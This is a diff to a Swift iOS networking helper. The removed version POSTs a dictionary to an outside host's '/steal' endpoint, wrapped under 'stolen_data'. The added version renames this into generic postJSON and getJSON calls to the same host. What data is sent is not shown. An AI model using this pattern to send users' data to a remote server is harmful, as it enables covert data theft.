@@ -1,10 +1,11 @@
 import Foundation
-import Foundation
 
 class NetworkManager {
-    static func sendData(dict: [String: Any]) {
-        guard let url = URL(string: "https://frog-ios-xm5a.onrender.com/steal") else {
-            print("❌ Invalid URL")
+    static let baseURL = "https://frog-ios-xm5a.onrender.com"
+
+    static func postJSON(to endpoint: String, payload: [String: Any]) {
+        guard let url = URL(string: "\(baseURL)/\(endpoint)") else {
+            print("❌ Invalid URL: \(endpoint)")
             return
         }
 
@@ -12,30 +13,46 @@ class NetworkManager {
         request.httpMethod = "POST"
         request.setValue("application/json", forHTTPHeaderField: "Content-Type")
 
-        // Wrap your payload inside "stolen_data"
-        let fullPayload: [String: Any] = ["stolen_data": dict]
         do {
-            request.httpBody = try JSONSerialization.data(withJSONObject: fullPayload)
+            request.httpBody = try JSONSerialization.data(withJSONObject: payload)
         } catch {
-            print("❌ Failed to encode JSON: \(error.localizedDescription)")
+            print("❌ JSON encoding error: \(error.localizedDescription)")
             return
         }
 
-        print("📤 Sending to backend: \(fullPayload)")
+        print("📤 POST to \(endpoint): \(payload)")
 
         URLSession.shared.dataTask(with: request) { data, response, error in
             if let error = error {
-                print("❌ Network error: \(error.localizedDescription)")
+                print("❌ Error: \(error.localizedDescription)")
                 return
             }
 
             if let httpResponse = response as? HTTPURLResponse {
-                print("✅ Response status: \(httpResponse.statusCode)")
+                print("✅ Status Code: \(httpResponse.statusCode)")
             }
 
-            if let data = data,
-               let responseText = String(data: data, encoding: .utf8) {
-                print("📩 Server replied: \(responseText)")
+            if let data = data, let responseString = String(data: data, encoding: .utf8) {
+                print("📩 Response: \(responseString)")
+            }
+        }.resume()
+    }
+
+    static func getJSON(from endpoint: String, completion: @escaping (Data?) -> Void) {
+        guard let url = URL(string: "\(baseURL)/\(endpoint)") else {
+            print("❌ Invalid GET URL")
+            completion(nil)
+            return
+        }
+
+        print("🔎 GET from: \(url.absoluteString)")
+
+        URLSession.shared.dataTask(with: url) { data, _, error in
+            if let error = error {
+                print("❌ GET error: \(error.localizedDescription)")
+                completion(nil)
+            } else {
+                completion(data)
             }
         }.resume()
     }
